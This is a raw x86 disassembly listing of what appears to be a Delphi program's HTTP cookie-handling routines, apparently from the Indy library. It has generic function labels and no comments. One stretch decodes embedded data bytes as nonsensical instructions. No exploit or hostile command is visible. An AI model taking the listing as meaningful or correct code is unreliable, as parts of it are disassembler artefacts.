mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x10 ]
call sub_405270
sete al
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4831cd
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404e68
retn
sub_4831d4
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_405314
xor eax eax
push ebp
push sub_483215
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebx + 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_404e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48321c
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_483234
push ebx
push esi
mov esi edx
mov ebx eax
push [ ebx + 0x18 ]
push r-xdata
push [ ebx + 0x24 ]
mov eax esi
mov edx 0x3
call sub_4051e4
pop esi
pop ebx
retn
sub_483260
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_483322
push [ fs : eax ]
mov [ fs : eax ] esp
push esi
xor ecx ecx
mov edx [ ebx + 0x24 ]
mov eax [ ebx + 0x18 ]
call sub_482e24
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ esi ]
mov edx [ ebx + 0x1c ]
mov eax r-xdata
call sub_482e24
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_404e98
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
mov ecx [ esi ]
mov edx [ ebx + 0x10 ]
mov eax r-xdata
call sub_482e24
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404e98
cmp [ ebx + 0x20 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov ecx [ esi ]
mov edx [ ebx + 0x14 ]
mov eax r-xdata
call sub_482e24
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_483329
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404e68
retn
lea ecx [ ebp - 0x10 ]
mov edx [ esi ]
mov eax r-xdata
call sub_482ee4
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_404e98
sub_483370
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_483492
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_417fa0
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x1c ]
call sub_404e98
mov eax [ ebx + 0x1c ]
call sub_405120
test eax eax
jle r-xdata
lea eax [ ebx + 0x1c ]
mov edx r-xdata
call sub_404e98
mov eax 0x1
mov edx [ ebx + 0x1c ]
dec eax
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
inc eax
cmp [ edx + eax - 0x1 ] 0x22
jne r-xdata
mov eax [ ebx + 0x1c ]
call sub_405120
mov edx [ ebx + 0x1c ]
dec eax
test edx edx
je r-xdata
lea eax [ ebx + 0x1c ]
mov ecx 0x1
mov edx 0x1
call sub_4053c4
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
inc eax
cmp [ edx + eax - 0x1 ] 0x22
jne r-xdata
lea ecx [ ebp - 0x8 ]
mov edx r-xdata
mov eax esi
call sub_417fa0
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
lea ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_417fa0
mov edx [ ebp - 0xc ]
lea eax [ ebx + 0x10 ]
call sub_404e98
mov edx r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
inc eax
setne al
mov [ ebx + 0x20 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_483499
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_404e68
retn
mov eax [ ebx + 0x1c ]
call sub_405120
mov edx eax
sub edx 0x1
jno r-xdata
lea eax [ ebx + 0x1c ]
call sub_4055ac
jmp r-xdata
call sub_403e34
sub_4834ec
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_405314
xor eax eax
push ebp
push sub_483758
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0xc ]
call sub_405270
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48375f
lea eax [ ebp - 0x44 ]
mov edx 0xe
call sub_404e68
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
mov eax [ ebp - 0x8 ]
add eax 0xc
mov edx [ ebp - 0x4 ]
call sub_404e98
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_48372e
push [ fs : eax ]
mov [ fs : eax ] esp
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_405468
test eax eax
jg r-xdata
push 0x1
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x4 ]
mov cl 0x1
mov edx r-xdata
call sub_463adc
mov edx [ ebp - 0x14 ]
lea ecx [ ebp - 0x10 ]
mov eax [ r-xdata ]
call sub_4626c4
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov edx [ ebp - 0x4 ]
mov eax r-xdata
call sub_405468
test eax eax
jne r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_405120
test eax eax
jle r-xdata
lea ecx [ ebp - 0x1c ]
xor edx edx
mov eax [ ebp - 0xc ]
call sub_417db0
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
add eax 0x18
call sub_404e98
lea ecx [ ebp - 0x24 ]
xor edx edx
mov eax [ ebp - 0xc ]
call sub_417db0
mov edx [ ebp - 0x24 ]
lea ecx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
call sub_417fa0
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x8 ]
add eax 0x24
call sub_404e98
xor edx edx
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
sub esi 0x1
jno r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x2c ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov eax [ r-xdata ]
call sub_4626c4
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
test esi esi
jl r-xdata
call sub_403e34
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea edx [ ebp - 0xc ]
mov eax [ r-xdata ]
call sub_462560
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0x3c ]
mov edx ebx
mov eax [ ebp - 0xc ]
call sub_417db0
mov edx [ ebp - 0x3c ]
lea ecx [ ebp - 0x38 ]
mov eax [ r-xdata ]
call sub_4626d8
push [ ebp - 0x38 ]
push r-xdata
lea ecx [ ebp - 0x44 ]
mov edx ebx
mov eax [ ebp - 0xc ]
call sub_417db0
mov edx [ ebp - 0x44 ]
lea ecx [ ebp - 0x40 ]
mov eax [ ebp - 0xc ]
call sub_417fa0
push [ ebp - 0x40 ]
lea eax [ ebp - 0x34 ]
mov edx 0x3
call sub_4051e4
mov ecx [ ebp - 0x34 ]
mov edx ebx
mov eax [ ebp - 0xc ]
mov edi [ eax ]
call [ edi + 0x20 ]
lea ecx [ ebp - 0x30 ]
mov edx ebx
mov eax [ ebp - 0xc ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x30 ]
lea ecx [ ebp - 0x2c ]
mov eax [ r-xdata ]
call sub_4626d8
mov ecx [ ebp - 0x2c ]
mov edx ebx
mov eax [ ebp - 0xc ]
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
lea ecx [ ebp - 0x28 ]
mov edx ebx
mov eax [ ebp - 0xc ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x28 ]
mov eax r-xdata
call sub_405468
test eax eax
jne r-xdata
inc ebx
dec esi
jne r-xdata
sub_483780
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_482f88
mov [ esi + 0x30 ] 0xffffffff
mov [ esi + 0x34 ] 0xffffffff
mov [ esi + 0x28 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_4837c8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_405314
xor eax eax
push ebp
push sub_48386f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_405120
test eax eax
jle r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4831d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_483876
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
xor eax eax
push ebp
push sub_483844
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_470cf0
fstp [ ebp - 0x10 ]
fwait
mov eax [ r-xdata ]
call sub_4626ec
fsubr [ ebp - 0x10 ]
fmul [ r-xdata ]
fdiv [ r-xdata ]
call sub_40326c
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x30 ] eax
mov [ ecx + 0x34 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_483849
call sub_404854
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4831d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_483876
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_48389c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_483963
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax ebx
call sub_483260
cmp [ ebx + 0x34 ] 0xffffffff
jne r-xdata
jle r-xdata
cmp [ ebx + 0x30 ] 0xffffffff
jbe r-xdata
lea eax [ ebp - 0xc ]
push eax
mov ecx [ esi ]
mov edx [ ebx + 0x3c ]
mov eax r-xdata
call sub_482e24
mov edx [ ebp - 0xc ]
mov eax esi
call sub_404e98
lea eax [ ebp - 0x10 ]
push eax
mov ecx [ esi ]
mov edx [ ebx + 0x38 ]
mov eax r-xdata
call sub_482e24
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_404e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48396a
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404e68
retn
mov eax [ ebx + 0x14 ]
call sub_405120
test eax eax
jne r-xdata
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push [ ebx + 0x34 ]
push [ ebx + 0x30 ]
lea edx [ ebp - 0x8 ]
mov eax [ r-xdata ]
call sub_462598
mov edx [ ebp - 0x8 ]
mov ecx [ esi ]
mov eax r-xdata
call sub_482e24
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_404e98
sub_4839a0
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_483ad0
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax ebx
call sub_483370
lea ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_417fa0
mov edx [ ebp - 0x4 ]
or ecx 0xffffffff
mov eax [ r-xdata ]
call sub_462668
cdq
mov [ ebx + 0x30 ] eax
mov [ ebx + 0x34 ] edx
lea ecx [ ebp - 0x8 ]
mov edx r-xdata
mov eax esi
call sub_417fa0
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x38 ]
call sub_404e98
lea ecx [ ebp - 0xc ]
mov edx r-xdata
mov eax esi
call sub_417fa0
mov edx [ ebp - 0xc ]
lea eax [ ebx + 0x3c ]
call sub_404e98
mov eax [ ebx + 0x14 ]
call sub_405120
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_483ad7
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404e68
retn
mov [ ebx + 0x28 ] 0x0
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
jl r-xdata
cmp [ ebx + 0x30 ] 0x0
jb r-xdata
mov eax [ r-xdata ]
call sub_4626ec
fstp [ ebp - 0x18 ]
fwait
mov eax [ r-xdata ]
call sub_463378
fsubr [ ebp - 0x18 ]
fstp [ ebp - 0x24 ]
fwait
push 0x0
push 0x3e8
mov eax [ ebx + 0x30 ]
mov edx [ ebx + 0x34 ]
call sub_405f78
jno r-xdata
jmp r-xdata
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] edx
fild [ ebp - 0x2c ]
fdiv [ r-xdata ]
fld [ ebp - 0x24 ]
faddp st1
add esp 0xfffffff8
fstp [ esp ]
fwait
lea edx [ ebp - 0x10 ]
mov eax [ r-xdata ]
call sub_462944
mov edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
call sub_403e34
sub_483b14
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_483780
mov [ esi + 0x28 ] 0x2
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_483b64
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_483d22
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax ebx
call sub_4839a0
lea ecx [ ebp - 0x10 ]
mov edx r-xdata
mov eax esi
call sub_417fa0
mov edx [ ebp - 0x10 ]
lea eax [ ebx + 0x40 ]
call sub_404e98
mov edx r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
inc eax
setne al
mov [ ebx + 0x44 ] al
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_483cf8
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx r-xdata
mov eax esi
call sub_417fa0
mov eax [ ebp - 0x4 ]
call sub_405120
test eax eax
jle r-xdata
mov ecx 0x50
xor edx edx
mov eax ebx
call sub_483d64
mov eax 0x1
mov edx [ ebp - 0x4 ]
dec eax
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
inc eax
cmp [ edx + eax - 0x1 ] 0x22
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_483cff
mov eax [ ebp - 0x8 ]
call sub_403f64
retn
mov eax [ ebp - 0x4 ]
call sub_405120
mov edx [ ebp - 0x4 ]
dec eax
test edx edx
je r-xdata
call sub_403e2c
cmp eax [ edx - 0x4 ]
jb r-xdata
inc eax
cmp [ edx + eax - 0x1 ] 0x22
jne r-xdata
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_405120
mov ecx eax
sub ecx 0x2
jno r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_405384
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
call sub_41854c
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jne r-xdata
call sub_403e34
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
sub eax 0x1
jno r-xdata
mov ecx 0x50
xor edx edx
mov eax ebx
call sub_483d64
jmp r-xdata
test eax eax
jl r-xdata
call sub_403e34
inc eax
mov [ ebp - 0xc ] eax
xor esi esi
lea ecx [ ebp - 0x18 ]
mov edx esi
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x18 ]
mov eax [ r-xdata ]
call sub_462614
mov ecx eax
mov edx esi
mov eax ebx
call sub_483d64
inc esi
dec [ ebp - 0xc ]
jne r-xdata
jmp r-xdata
sub_483d64
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebx + 0x48 ]
call sub_406250
mov edx esi
sub edx eax
jno r-xdata
dec edx
jg r-xdata
call sub_403e34
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4631dc
call sub_4047d8
test esi esi
jge r-xdata
dec edx
jne r-xdata
call sub_403e34
mov eax [ ebx + 0x48 ]
call sub_406250
mov edx esi
sub edx eax
jno r-xdata
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
mov eax esi
add eax 0x1
jno r-xdata
call sub_403e2c
cmp esi [ eax - 0x4 ]
jb r-xdata
push eax
lea eax [ ebx + 0x48 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_406404
add esp 0x4
call sub_403e34
mov [ eax + esi * 4 ] edi
pop edi
pop esi
pop ebx
retn
sub_483ef0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov eax [ r-xdata ]
push eax
xor edx edx
mov eax esi
call sub_417804
mov dl 0x1
mov eax [ r-xdata ]
call sub_40f5e8
mov [ esi + 0x20 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_404288
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
sub_483f4c
push ebx
push esi
push edi
push ebp
call sub_404330
mov ebx edx
mov ebp eax
mov eax ebp
call sub_417470
mov eax [ ebp + 0x1c ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
sub esi 0x1
jno r-xdata
test esi esi
jl r-xdata
call sub_403e34
lea edx [ ebp + 0x1c ]
mov eax [ r-xdata ]
call sub_462560
lea edx [ ebp + 0x20 ]
mov eax [ r-xdata ]
call sub_462560
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_417358
test bl bl
jle r-xdata
inc esi
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4042d8
mov eax [ ebp + 0x1c ]
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
call sub_403f64
inc edi
dec esi
jne r-xdata
sub_483fc4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4840cc
mov edi eax
xor edx edx
push ebp
push sub_48409e
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ esi + 0x10 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x54 ]
inc eax
jne r-xdata
mov edx [ esi + 0x10 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ esi + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov edx [ esi + 0x10 ]
mov ecx eax
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov edx [ esi + 0x10 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax esi
call sub_403f64
mov edx [ esi + 0x10 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ esi + 0x18 ]
mov ecx esi
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4840a5
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4840f0
retn
sub_4840cc
push ebx
mov ebx eax
sub dl 0x1
jb r-xdata
mov eax [ ebx + 0x20 ]
call sub_40f7e4
jmp r-xdata
je r-xdata
mov eax [ ebx + 0x1c ]
pop ebx
retn
mov eax [ ebx + 0x20 ]
call sub_40f6e8
jmp r-xdata
sub_48410c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_48415d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_484164
retn
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_405af0
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_405af0
sub_484220
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ edx + 0x48 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0x42
dec eax
add [ eax + eax ] cl
add [ eax + 0x4f ] ch
inc esi
fcomp st6
inc ecx
add [ eax ] cl
loop r-xdata
add [ eax + 0x24004041 ] bh
fild [ ecx ]
rol [ ecx + 0x40 ] 0x0
mov ah 0x41
inc eax
add ah bh
inc eax
add [ eax ] bl
aas
inc eax
add [ ebx + eax * 2 + 0x48 ] bl
add [ esi + ebp * 2 - 0x2213ffbf ] ch
inc ecx
add al cl
insd
inc ecx
add ah al
fiadd [ ecx ]
mov ebp ds
inc ecx
add ah dl
fiadd [ ecx ]
int3
dec eax
add ah bh
dec edi
inc esi
add [ 0x64490f00 ] al
inc ebx
outsd
outsd
imul ebp [ ecx + 0x65 ] 0x4d
popad
outsb
popad
jb r-xdata
add [ eax + 0x50 ] dh
inc esi
add [ ecx + ecx * 2 + 0x48 ] ah
add al dl
inc edi
dec eax
add al ch
inc edi
dec eax
add [ edi + eax * 2 + 0x54100048 ] ch
dec ecx
inc ebx
outsd
outsd
imul ebp [ ecx + 0x65 ] 0x4d
popad
outsb
popad
jb r-xdata
dec eax
add [ eax ] dh
add [ eax ] al
push [ eax ]
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080002 ] al
outsb
inc ebx
jb r-xdata
add ah cl
inc ecx
add al ch
loope r-xdata
inc eax
add al al
inc edx
dec eax
add [ edi ] al
adc [ ecx + ecx * 2 + 0x64 ] dl
inc ebx
outsd
outsd
imul ebp [ ecx + 0x65 ] 0x4d
popad
outsb
popad
jb r-xdata
push edx
cmp [ ebp - 0x4f5eb7aa ] cl
xor al [ esi ]
popad
je r-xdata
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0004 ] al
outsb
dec esi
ja r-xdata
inc edx
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
call sub_462560
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41daa8
test bl bl
jle r-xdata
push esi
dec eax
int3
mov eax [ r-xdata ]
outsd
outsd
imul ebp [ ecx + 0x65 ] 0xffffff90
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
mov eax esi
call sub_484800
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
lea edx [ esi + 0x48 ]
sub_48439c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0xd ] cl
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4845ca
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_484800
lea eax [ ebp - 0x4 ]
call sub_404e44
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x48 ]
xor edx edx
call sub_4840cc
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_48459a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4845a1
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x48 ]
xor edx edx
call sub_4840f0
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403f34
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_484578
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
mov edx [ eax ]
call [ edx + 0x14 ]
sub eax 0x1
jno r-xdata
test eax eax
jl r-xdata
call sub_403e34
mov eax [ ebp - 0x18 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
sub esi 0x1
jno r-xdata
inc eax
mov [ ebp - 0x20 ] eax
xor esi esi
cmp esi 0x0
jl r-xdata
call sub_403e34
inc esi
dec [ ebp - 0x20 ]
jne r-xdata
mov edx esi
mov eax [ ebp - 0x1c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_404114
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
sub ebx 0x1
jno r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
call sub_403f64
retn
mov eax [ ebp - 0x4 ]
call sub_405120
test eax eax
jle r-xdata
lea ecx [ ebp - 0x24 ]
mov edx esi
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x24 ]
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x18 ]
call ebx
test eax eax
jle r-xdata
cmp ebx 0x0
jl r-xdata
call sub_403e34
push [ ebp - 0x4 ]
mov edx esi
mov eax [ ebp - 0x18 ]
call sub_482f74
push [ eax + 0x18 ]
push r-xdata
mov edx esi
mov eax [ ebp - 0x18 ]
call sub_482f74
push [ eax + 0x24 ]
lea eax [ ebp - 0x4 ]
mov edx 0x4
call sub_4051e4
dec esi
cmp esi 0xffffffff
jne r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40512c
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_482f74
mov eax [ eax + 0x1c ]
mov edx [ ebp - 0xc ]
mov edx [ edx + 0x14 ]
call sub_405468
dec eax
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_482f74
mov edi eax
movzx eax [ edi + 0x20 ]
and al [ ebp - 0xd ]
jne r-xdata
cmp [ edi + 0x24 ] 0x0
je r-xdata
cmp [ edi + 0x20 ] 0x0
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x14 ]
call sub_482f74
mov ecx eax
mov edx [ edi + 0x1c ]
mov eax [ ebp - 0x18 ]
mov edi [ eax ]
call [ edi + 0x3c ]
sub_4845a1
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_404e98
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4845d1
lea eax [ ebp - 0x24 ]
call sub_404e44
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
sub_4845f4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_405314
mov eax [ ebp + 0x8 ]
call sub_405314
xor eax eax
push ebp
push sub_4846c2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4834ec
mov eax [ ebx + 0x10 ]
call sub_405120
